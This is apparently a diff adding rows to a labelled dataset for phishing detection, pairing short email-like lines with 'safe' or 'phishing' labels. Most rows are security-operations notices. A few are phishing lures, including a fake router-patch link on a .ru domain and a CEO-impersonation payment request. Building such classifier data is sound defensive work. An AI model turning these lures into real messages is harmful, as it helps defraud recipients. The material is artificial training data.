+"Your sourdough banneton sizing guide.",safe
+"KRACK WPA2 handshake attack - router firmware update malware link.",phishing
+"Community pool lap swim schedule.",safe
+"Dragonblood WPA3 downgrade - patch router http://router-wpa3-fix.ru",phishing
+"Your telescope Bahtinov mask usage.",safe
+"BlueBorne Bluetooth RCE - phone infected click to clean.",phishing
+"Scout troop first aid kit inventory.",safe
+"Bleedingbit Texas Instruments BLE chip - IoT device update scam.",phishing
+"Your knitting circular needle organizer.",safe
+"Urgent Zelle payment to new recipient - CEO impersonation.",phishing
+"Normal team standup notes for Monday - no suspicious links.",safe
+"Your quarterly performance review is scheduled - see HR portal.",safe
+"Please reset your password using the official company SSO portal only.",safe
+"Attached invoice #4421 from verified vendor Acme Corp.",safe
+"Reminder: enable MFA on your work account per security policy.",safe
+"Phishing simulation: This is a test email from security team - report if received.",safe
+"Your 401k statement is available in the benefits portal.",safe
+"IT: Scheduled maintenance Sunday 2am-4am - no action required.",safe
+"Welcome aboard! Complete onboarding in the HR system.",safe
+"Conference room B booked for your 2pm meeting.",safe
+"Please use bcrypt for password hashing in the new auth module.",safe
+"Security training completion certificate attached.",safe
+"Your pull request #256 needs one more approval.",safe
+"Database backup completed successfully.",safe
+"New team member intro - Jane joins engineering Monday.",safe
+"Office supplies order delivered to front desk.",safe
+"Please review the OWASP Top 10 document on the wiki.",safe
+"VPN client update pushed to your machine automatically.",safe
+"Your parking spot assignment for Building C.",safe
+"Holiday schedule posted on intranet.",safe
+"Expense report #881 approved.",safe
+"Client meeting moved to Zoom - link in calendar invite only.",safe
+"Please do not click links in unsolicited emails - security reminder.",safe
+"Your badge access expires in 30 days - renew at security desk.",safe
+"Firewall rule change approved for staging environment.",safe
+"Penetration test report summary for Q1 attached.",safe
+"SSL certificate renewal completed for company.com.",safe
+"Your two-factor authentication backup codes were regenerated.",safe
+"Incident response drill scheduled next Thursday.",safe
+"Log rotation policy updated - no user action needed.",safe
+"New security camera installed in lobby.",safe
+"Please report phishing to security@company.com.",safe
+"Your encrypted USB drive is ready for pickup.",safe
+"Data classification training due by end of month.",safe
+"SIEM alert: false positive on port scan - resolved.",safe
+"Your PGP key signing party invitation Saturday.",safe
+"Bug bounty program launch announcement.",safe
+"CVE-2024-1234 patched on production servers.",safe
+"Your security clearance renewal paperwork.",safe
+"Red team exercise findings debrief Monday.",safe
+"WAF rules updated for SQL injection patterns.",safe
+"Your hardware security key registered successfully.",safe
+"Disaster recovery test passed.",safe
+"Please verify sender domain before wiring funds - finance policy.",safe
+"Your SOC analyst shift swap approved.",safe
+"Threat intelligence feed subscription renewed.",safe
+"Immutable backup snapshot created.",safe
+"Your zero trust network access provisioned.",safe
+"Container image scanned - no critical vulnerabilities.",safe
+"Kubernetes RBAC policy audit complete.",safe
+"Your secrets manager rotation completed.",safe
+"HIPAA compliance training reminder.",safe
+"PCI DSS scan scheduled for next week.",safe
+"Your GDPR data export request processed.",safe
+"Privacy policy update - review on website.",safe
+"Cookie consent banner deployed on marketing site.",safe
+"Your anonymized analytics opt-out confirmed.",safe
+"Right to deletion request completed.",safe
+"Data retention policy 90-day purge ran.",safe
+"Your consent form for research study signed.",safe
+"Ethics board approval for security survey.",safe
+"IRB protocol amendment approved.",safe
+"Your academic paper revision request.",safe
+"Peer review comments on cryptography chapter.",safe
+"Grant application deadline extended to June 1.",safe
+"Your thesis advisor meeting Thursday 3pm.",safe
+"Library interloan book arrived.",safe
+"Campus WiFi password rotation - use eduroam.",safe
+"Your student ID card replacement ready.",safe
+"Graduation ceremony seating assignment.",safe
+"Alumni networking event registration.",safe
+"Your internship offer letter attached.",safe
+"Background check clearance for security role.",safe
+"NDA signed for penetration testing engagement.",safe
+"Your CISSP study group meets Tuesdays.",safe
+"CEU credits applied to certification.",safe
+"CompTIA Security+ exam voucher enclosed.",safe
+"Your OSCP lab extension approved.",safe
+"Capture The Flag team registration open.",safe
+"Hackathon prize distribution next week.",safe
+"Your open source security tool contribution merged.",safe
+"Responsible disclosure acknowledgment received.",safe
+"Bug report #991 triaged as medium severity.",safe
+"Your HackerOne reputation points updated.",safe
+"Security conference speaker confirmation.",safe
+"Your DEF CON badge pickup instructions.",safe
+"Black Hat training course materials.",safe
+"RSA conference session recording link.",safe
+"Your SANS course completion certificate.",safe
+"ISC2 membership renewal notice.",safe
+"OWASP chapter meeting agenda.",safe
+"Your local 2600 meeting location.",safe
+"Cryptoparty key signing event.",safe
+"Tor bridge relay setup guide - legitimate.",safe
+"Your PGP key published to keyserver.",safe
+"Signal group invite for security researchers.",safe
+"Matrix room for incident coordination.",safe
+"Your Mastodon security community follow.",safe
+"Bluesky verification for infosec account.",safe
+"LinkedIn connection from known colleague - verify profile.",safe
+"Your GitHub security advisory published.",safe
+"npm package deprecation security notice.",safe
+"PyPI yanked malicious package alert - official.",safe
+"Your Docker Hub image scan results.",safe
+"Kubernetes CVE patched in cluster.",safe
+"Helm chart security update available.",safe
+"Your Terraform module lint passed.",safe
+"Ansible playbook idempotency check OK.",safe
+"Puppet manifest compliance scan clean.",safe
+"Chef cookbook dependency audit done.",safe
+"Your Salt minion key accepted.",safe
+"Nagios alert: disk space OK after cleanup.",safe
+"Prometheus alert resolved: high memory.",safe
+"Grafana dashboard shared with team.",safe
+"Your ELK stack index lifecycle updated.",safe
+"Splunk search saved for brute force detection.",safe
+"Wireshark capture analysis complete.",safe
+"Your tcpdump filter cheat sheet.",safe
+"nmap scan results for authorized pentest.",safe
+"Metasploit module documentation update.",safe
+"Your Burp Suite project file.",safe
+"OWASP ZAP scan report attached.",safe
+"Nikto web server scan findings.",safe
+"Your SQLmap authorized test output.",safe
+"Hydra lab exercise credentials - classroom only.",safe
+"John the Ripper hash cracking contest rules.",safe
+"Your hashcat benchmark results.",safe
+"Aircrack-ng lab setup for WPA2 cracking demo.",safe
+"Wireshark display filter for DNS exfiltration lab.",safe
+"Your Scapy packet crafting tutorial.",safe
+"Impacket usage in Active Directory lab.",safe
+"BloodHound path analysis for red team exercise.",safe
+"Your Mimikatz detection Sigma rule.",safe
+"Cobalt Strike license for authorized training.",safe
+"Your YARA rule for ransomware detection.",safe
+"Snort IDS rule update deployed.",safe
+"Suricata ET open ruleset synced.",safe
+"Your Bro/Zeek script for TLS inspection.",safe
+"Osquery fleet query scheduled.",safe
+"Your Falco runtime rule triggered test alert.",safe
+"eBPF tracing workshop materials.",safe
+"Your strace syscall analysis homework.",safe
+"GDB debugging buffer overflow lab.",safe
+"Radare2 reverse engineering challenge.",safe
+"Your Ghidra project for malware sample.",safe
+"IDA Pro license renewal for university.",safe
+"Binary Ninja cloud sync complete.",safe
+"Your x64dbg breakpoint cheat sheet.",safe
+"Frida dynamic instrumentation script.",safe
+"Your objection mobile app hooking lab.",safe
+"APKTool decompilation exercise.",safe
+"jadx Android reverse engineering setup.",safe
+"Your iOS jailbreak detection bypass research.",safe
+"SSL pinning bypass for authorized app test.",safe
+"Your OWASP MASVS compliance checklist.",safe
+"Mobile app pentest report draft.",safe
+"API security testing with Postman collection.",safe
+"Your OpenAPI spec validation errors fixed.",safe
+"GraphQL introspection disabled in production.",safe
+"Your JWT algorithm confusion lab writeup.",safe
+"OAuth 2.0 PKCE implementation review.",safe
+"SAML assertion signature verified.",safe
+"Your LDAP injection test cases.",safe
+"NoSQL injection prevention guide.",safe
+"XXE disabled in XML parser config.",safe
+"Your SSRF allowlist configuration.",safe
+"CSRF token rotation implemented.",safe
+"Clickjacking X-Frame-Options DENY set.",safe
+"Your CSP report-only mode findings.",safe
+"HSTS preload submission approved.",safe
+"Certificate transparency log monitor alert.",safe
+"Your DNSSEC validation enabled.",safe
+"DMARC policy p=reject configured.",safe
+"SPF record updated for mail server.",safe
+"Your DKIM key rotation scheduled.",safe
+"BIMI logo verification in progress.",safe
+"Email authentication workshop slides.",safe
+"Your phishing report button deployed in Outlook.",safe
+"Safe links policy enabled in M365.",safe
+"Attachment filtering blocked macro doc.",safe
+"Your sandbox detonation queue empty.",safe
+"Threat feed IOC blocklist updated.",safe
+"Your STIX/TAXII subscription active.",safe
+"MISP event shared with ISAC.",safe
+"Your YARA hunt across endpoints complete.",safe
+"EDR agent health check 100%.",safe
+"Your XDR correlation rule tuned.",safe
+"SOAR playbook automated phishing triage.",safe
+"Your incident ticket INC-4421 closed.",safe
+"Post-mortem blameless review scheduled.",safe
+"Your runbook for ransomware response.",safe
+"Backup restore test successful.",safe
+"Your air-gapped backup verified.",safe
+"Tape rotation schedule updated.",safe
+"Offsite vault inventory complete.",safe
+"Your business continuity plan exercise.",safe
+"Tabletop scenario: supply chain attack.",safe
+"Your crisis communication template.",safe
+"Media statement draft for breach - legal review.",safe
+"Regulatory notification timeline 72 hours.",safe
+"Your cyber insurance policy renewal.",safe
+"Risk register updated Q2.",safe
+"Your FAIR quantitative risk model.",safe
+"Third party vendor assessment due.",safe
+"Your SOC 2 Type II audit scheduled.",safe
+"ISO 27001 surveillance audit prep.",safe
+"NIST CSF maturity assessment results.",safe
+"Your CIS Controls implementation score.",safe
+"MITRE ATT&CK mapping for detection rules.",safe
+"D3FEND defensive technique catalog review.",safe
+"Your threat modeling STRIDE diagram.",safe
+"PASTA risk-centric threat model.",safe
+"Kill chain analysis for recent campaign.",safe
+"Your diamond model intrusion analysis.",safe
+"Campaign tracking graph updated.",safe
+"APT group TTP correlation report.",safe
+"Your geolocation of C2 server - authorized.",safe
+"WHOIS history for suspicious domain.",safe
+"Passive DNS replication findings.",safe
+"Your VirusTotal API quota reset.",safe
+"Hybrid Analysis sandbox report.",safe
+"Any.Run interactive malware session.",safe
+"Your Joe Sandbox PDF report.",safe
+"Cuckoo sandbox automation complete.",safe
+"REMnux distro update for malware analysis.",safe
+"Your FLARE VM Windows analysis setup.",safe
+"SIFT workstation forensic image mounted.",safe
+"Autopsy timeline analysis export.",safe
+"Your Volatility memory dump plugins.",safe
+"Rekall framework deprecated notice.",safe
+"Plaso super timeline generation.",safe
+"Your bulk_extractor credit card scan.",safe
+"Foremost file carving results.",safe
+"Scalpel recovery of deleted files.",safe
+"Your photorec partition recovery.",safe
+"dd image integrity hash verified.",safe
+"Write blocker chain of custody form.",safe
+"Your legal hold preservation notice.",safe
+"eDiscovery collection scope defined.",safe
+"Forensic examiner certification renewal.",safe
+"Your expert witness report draft.",safe
+"Court admissibility checklist for digital evidence.",safe
+"Chain of custody log signed.",safe
+"Your hash comparison match confirmed.",safe
+"Timeline correlation with CCTV.",safe
+"Mobile forensics UFED extraction complete.",safe
+"Your Cellebrite license updated.",safe
+"Cloud forensics AWS snapshot acquired.",safe
+"Azure activity log exported.",safe
+"Your GCP audit log BigQuery export.",safe
+"Office 365 Purview eDiscovery hold.",safe
+"Slack export for litigation.",safe
+"Your Teams retention policy applied.",safe
+"Zoom recording preservation notice.",safe
+"Browser history forensic analysis.",safe
+"Your cookie forensic reconstruction.",safe
+"Flash cookie local shared objects.",safe
+"HTML5 localStorage examination.",safe
+"Your indexedDB forensic parser.",safe
+"Service worker cache analysis.",safe
+"WebRTC leak test results - privacy.",safe
+"Your Tor browser bundle checksum.",safe
+"I2P router console security.",safe
+"Freenet darknet legal warning.",safe
+"Your blockchain transaction tracing.",safe
+"Cryptocurrency exchange subpoena response.",safe
+"NFT smart contract audit findings.",safe
+"Your DeFi rug pull detection heuristics.",safe
+"Smart contract reentrancy fix deployed.",safe
+"Solidity slither static analysis clean.",safe
+"Your hardware wallet firmware verified.",safe
+"Seed phrase never share - security reminder.",safe
+"Multi-sig wallet 2-of-3 configured.",safe
+"Your cold storage air gap procedure.",safe
+"Paper wallet generation offline.",safe
+"Shamir secret sharing backup split.",safe
+"Your HSM key ceremony documentation.",safe
+"PKI root CA certificate rotation.",safe
+"Intermediate CA cross-signing complete.",safe
+"Your code signing certificate renewed.",safe
+"Timestamp authority RFC 3161 compliant.",safe
+"OCSP stapling enabled on web server.",safe
+"Your CRL distribution point updated.",safe
+"Certificate pinning in mobile app.",safe
+"Let's Encrypt auto-renewal success.",safe
+"Your ACME DNS-01 challenge completed.",safe
+"Wildcard cert issued for *.dev.example.com.",safe
+"mTLS client certificate issued.",safe
+"Your SPIFFE SVID rotation.",safe
+"Service mesh mutual TLS enforced.",safe
+"Zero trust identity provider sync.",safe
+"Your OPA policy decision log.",safe
+"RBAC least privilege audit passed.",safe
+"ABAC attribute rule test cases.",safe
+"Your MAC mandatory access control lab.",safe
+"SELinux enforcing mode enabled.",safe
+"AppArmor profile loaded for nginx.",safe
+"Your seccomp syscall filter profile.",safe
+"Landlock LSM sandbox experiment.",safe
+"Capabilities CAP_NET_BIND_SERVICE dropped.",safe
+"Your container runs as non-root user.",safe
+"Read-only root filesystem in pod.",safe
+"Network policy deny-all default.",safe
+"Your Pod Security Standards restricted.",safe
+"Admission controller OPA Gatekeeper.",safe
+"Kyverno policy validate images.",safe
+"Your Falco syscall anomaly detected test.",safe
+"Tetragon eBPF security observability.",safe
+"Cilium network policy audit.",safe
+"Your Istio authorization policy.",safe
+"Envoy WASM filter for WAF.",safe
+"ModSecurity CRS rule set updated.",safe
+"Your Cloudflare WAF managed rules.",safe
+"AWS WAF rate limiting rule.",safe
+"Azure Front Door bot protection.",safe
+"Your Google Cloud Armor policy.",safe
+"Imperva DDoS protection activated.",safe
+"Akamai Kona Site Defender config.",safe
+"Your Fastly signal sciences agent.",safe
+"Rate limit 100 req/min per IP.",safe
+"Geo block countries on sanction list.",safe
+"Your IP reputation blocklist feed.",safe
+"Bot management challenge issued.",safe
+"CAPTCHA after failed login attempts.",safe
+"Your honeypot Cowrie SSH logs.",safe
+"Dionaea malware capture sample.",safe
+"T-Pot multi-honeypot dashboard.",safe
+"Your Canarytoken triggered alert.",safe
+"Thinkst canary document opened.",safe
+"Honeytoken AWS access key planted.",safe
+"Your deception technology engagement.",safe
+"Moving target defense IP rotation.",safe
+"DNS flux fast flux detection.",safe
+"Your domain generation algorithm hunt.",safe
+"Sinkhole malicious C2 traffic.",safe
+"Law enforcement takedown coordination.",safe
+"Your threat actor dossier updated.",safe
+"OSINT social media profile correlation.",safe
+"Maltego transform graph export.",safe
+"Your Shodan search for exposed RDP.",safe
+"Censys certificate search results.",safe
+"ZoomEye host enumeration report.",safe
+"Your BinaryEdge scan data.",safe
+"SecurityTrails subdomain history.",safe
+"PassiveTotal DNS trail analysis.",safe
+"Your RiskIQ illuminate portal.",safe
+"Recorded Future threat card.",safe
+"Flashpoint intelligence brief.",safe
+"Your Mandiant advantage subscription.",safe
+"CrowdStrike Falcon intelligence.",safe
+"SentinelOne threat hunting query.",safe
+"Your Palo Alto Unit 42 report.",safe
+"Fortinet threat landscape update.",safe
+"Check Point threat cloud IOC.",safe
+"Your Trend Micro threat encyclopedia.",safe
+"SophosLabs virus definition.",safe
+"ESET threat encyclopedia entry.",safe
+"Your Kaspersky threat intelligence.",safe
+"Bitdefender gravity zone alert.",safe
+"McAfee GTI reputation check.",safe
+"Symantec broadcom protection alert.",safe
+"Your Microsoft Defender threat analytics.",safe
+"Google Safe Browsing API check.",safe
+"PhishTank submission confirmed.",safe
+"Your OpenPhish feed integration.",safe
+"URLhaus malware URL block.",safe
+"Abuse.ch threat feed sync.",safe
+"Your Spamhaus DROP list query.",safe
+"SURBL URI blocklist check.",safe
+"URIBL multi-blocklist test.",safe
+"Barracuda reputation score.",safe
+"Your Proofpoint TAP alert.",safe
+"Mimecast targeted attack protection.",safe
+"Abnormal Security AI detection.",safe
+"Your GreatHorn email security.",safe
+"Area 1 Horizon preemptive capture.",safe
+"Ironscales mailbox-level protection.",safe
+"Your Cofense phishing reporting.",safe
+"KnowBe4 training campaign results.",safe
+"Proofpoint security awareness module.",safe
+"Your Wombat phishing simulation.",safe
+"PhishMe reporter plugin stats.",safe
+"SANS security awareness tip of the day.",safe
+"Your NIST password guidelines summary.",safe
+"Use passphrases with 4+ random words.",safe
+"Password manager recommended for all accounts.",safe
+"Never reuse passwords across sites.",safe
+"Enable hardware MFA where possible.",safe
+"Your security hygiene score improved.",safe
